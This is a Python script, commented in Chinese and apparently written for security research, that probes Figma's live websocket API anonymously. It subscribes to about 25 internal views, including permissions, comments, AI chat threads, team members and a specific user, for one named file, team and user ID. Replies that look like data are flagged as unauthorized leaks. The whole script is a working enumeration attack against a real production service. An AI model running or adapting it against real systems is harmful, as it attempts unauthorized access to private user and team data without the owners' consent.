# -*- coding: utf-8 -*-
"""livegraph 匿名 view 枚举:对 A 文件订阅候选 view,找未授权数据泄露
连接参数参考 F2 报告(匿名连接不需要 pr/pt/ph)
"""
import json, sys, time, websocket, urllib3
urllib3.disable_warnings()

FILE_A = 'IHt8kgtR3XmtqU5i8vz7p1'
CLIENT_URL = 'https://www.figma.com/file/%s' % FILE_A

VIEWS = [
    ('FileView', {'fileKey': FILE_A}),
    ('FileMetaView', {'fileKey': FILE_A}),
    ('FilePermissionsView', {'fileKey': FILE_A}),
    ('FileVersionsView', {'fileKey': FILE_A, 'firstPageSize': 10}),
    ('VersionView', {'fileKey': FILE_A, 'firstPageSize': 10}),
    ('CommentsView', {'fileKey': FILE_A, 'firstPageSize': 10}),
    ('CommentView', {'fileKey': FILE_A, 'firstPageSize': 10}),
    ('FileCommentsView', {'fileKey': FILE_A, 'firstPageSize': 10}),
    ('AiThreadView', {'fileKey': FILE_A, 'firstPageSize': 10}),
    ('AiChatView', {'fileKey': FILE_A, 'firstPageSize': 10}),
    ('MakeView', {'fileKey': FILE_A}),
    ('TeamView', {'teamId': '1666382706663462213'}),
    ('TeamUsersView', {'teamId': '1666382706663462213'}),
    ('UserView', {'userId': '1666382703778278399'}),
    ('SharedUsersView', {'fileKey': FILE_A}),
    ('FolderView', {'folderId': '634606970'}),
    ('DesignSystemView', {'fileKey': FILE_A}),
    ('LibraryView', {'fileKey': FILE_A}),
    ('FileShareView', {'fileKey': FILE_A}),
    ('PlanView', {'fileKey': FILE_A}),
    ('MakeThreadView', {'fileKey': FILE_A}),
    ('MakeVersionsView', {'fileKey': FILE_A}),
    ('AiAssistantView', {'fileKey': FILE_A}),
    ('FileContentView', {'fileKey': FILE_A}),
    ('SceneView', {'fileKey': FILE_A}),
]

def test_view(name, args):
    url = ('wss://www.figma.com/api/livegraph?pv=1&userId=&anonUserId=&clientType=web'
           '&preload=%%7B%%7D&requestedProtocolVersion=2&clientUrl=%s&connectionType=initial&reconnect=0'
           % CLIENT_URL)
    try:
        ws = websocket.create_connection(url, timeout=8,
                                         header=['User-Agent: Mozilla/5.0'])
    except Exception as e:
        print('[%s] CONN FAIL %s' % (name, str(e)[:60]))
        return
    try:
        # auth frame
        ws.send(json.dumps({
            'messageType': 'auth', 'clientType': 'web',
            'args': {'userId': None, 'anonymousUserId': None},
            'tags': {'clientType': 'web', 'clientUrl': CLIENT_URL},
            'clientRequestedVersion': 2}))
        time.sleep(0.5)
        # subscribe
        sub = {'messageType': 'subscribe', 'viewName': name,
               'viewHash': 'abababababababababababababababab',
               'loadType': 'initial', 'args': args}
        ws.send(json.dumps(sub))
        got = []
        ws.settimeout(3)
        try:
            while len(got) < 2:
                msg = ws.recv()
                got.append(msg)
        except Exception:
            pass
        joined = ' '.join(got)
        if 'error' in joined.lower() and 'permission' in joined.lower():
            print('[%s] denied (permission error)' % name)
        elif 'MakeVersion' in joined or 'version' in joined.lower() or '{"meta"' in joined or 'thread' in joined.lower():
            print('[%s] !! DATA: %s' % (name, joined[:300]))
        else:
            print('[%s] no-data: %s' % (name, joined[:150]))
    except Exception as e:
        print('[%s] ERR %s' % (name, str(e)[:60]))
    finally:
        try:
            ws.close()
        except Exception:
            pass

for name, args in VIEWS:
    test_view(name, args)
    time.sleep(0.3)
